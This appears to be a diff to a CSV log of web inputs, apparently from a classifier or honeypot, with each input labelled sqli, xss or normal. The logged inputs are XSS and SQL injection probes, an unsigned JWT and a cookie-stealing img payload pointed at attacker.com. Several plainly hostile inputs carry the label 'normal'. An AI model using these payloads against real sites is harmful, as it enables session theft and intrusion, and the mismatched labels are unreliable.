@@ -1,1 +1,8 @@
 2026-04-01T01:05:29.139863,select *,sqli,"{'data': [{'username': 'admin', 'password': '1234'}, {'username': 'user', 'password': 'abcd'}]}"
+2026-04-04 14:15:00.927945,<svg/onload=alert(1)>,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:15:09.350552,login attempt,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:15:55.569730,<iframe src='javascript:alert(1)'></iframe>,xss,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:21:54.218044,' OR 1=1 --,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:22:43.993833,eyJhbGciOiJub25l...,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:28:22.336191,<img src='http://attacker.com/steal?c='+document.cookie>,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
+2026-04-04 14:29:20.789592,eyJhbGciOiJIUzI1Ni...,normal,[SYSTEM ERROR] Server temporarily overloaded. Connection reset by peer.
